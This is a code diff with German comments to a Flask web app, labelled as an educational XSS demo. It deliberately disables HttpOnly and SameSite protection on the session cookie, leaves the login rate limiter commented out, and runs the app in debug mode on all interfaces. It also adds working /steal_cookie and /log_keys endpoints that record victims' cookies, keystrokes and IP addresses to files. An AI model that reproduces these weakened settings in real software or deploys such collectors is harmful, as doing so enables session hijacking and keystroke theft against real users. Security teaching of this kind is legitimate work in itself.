@@ -8,6 +8,10 @@ import os
 app = Flask(__name__)
 app.secret_key = os.urandom(24)  # for sessions
 
+# XSS DEMO: HttpOnly Cookie deaktivieren (damit document.cookie funktioniert)
+app.config['SESSION_COOKIE_HTTPONLY'] = False
+app.config['SESSION_COOKIE_SAMESITE'] = None
+
 # BRUTE-FORCE SCHUTZ: Rate Limiting (auskommentiert für Tests)
 # limiter = Limiter(
 #     get_remote_address,
@@ -61,7 +65,7 @@ def register():
 
 # --- LOGIN ---
 @app.route("/login", methods=["GET","POST"])
-# @limiter.limit("5 per minute")  # Max 5 Login-Versuche pro Minute (Brute-Force Schutz)
+#@limiter.limit("5 per minute")  
 def login():
     if request.method == "POST":
         username = request.form.get("username", "")
@@ -207,6 +211,41 @@ def search():
             conn.close()
     
     return render_template("search.html", results=results, search_term=search_term)
+
+# --- XSS DEMO ENDPOINTS (Bildungszwecke) ---
+@app.route("/steal_cookie", methods=["GET", "POST"])
+def steal_cookie():
+    """Endpoint zum Empfangen gestohlener Cookies"""
+    cookie = request.args.get("c") or request.form.get("c", "")
+    victim_ip = get_remote_address()
+
+    print("\n" + "="*60)
+    print("🚨 COOKIE GESTOHLEN!")
+    print("="*60)
+    print(f"Victim IP: {victim_ip}")
+    print(f"Cookie: {cookie}")
+    print("="*60 + "\n")
+
+    # Optional: In Datei speichern
+    with open("stolen_cookies.txt", "a") as f:
+        f.write(f"[{victim_ip}] {cookie}\n")
+
+    return "", 200
+
+@app.route("/log_keys", methods=["POST"])
+def log_keys():
+    """Endpoint zum Empfangen von Keylogger-Daten"""
+    keys = request.form.get("keys", "")
+    victim_ip = get_remote_address()
+
+    if keys:
+        print(f"\n⌨️  KEYLOG [{victim_ip}]: {keys}")
+
+        # Optional: In Datei speichern
+        with open("keylog.txt", "a") as f:
+            f.write(f"[{victim_ip}] {keys}\n")
+
+    return "", 200
 
 if __name__ == "__main__":
     app.run(debug=True, host='0.0.0.0', port=5001, threaded=True)
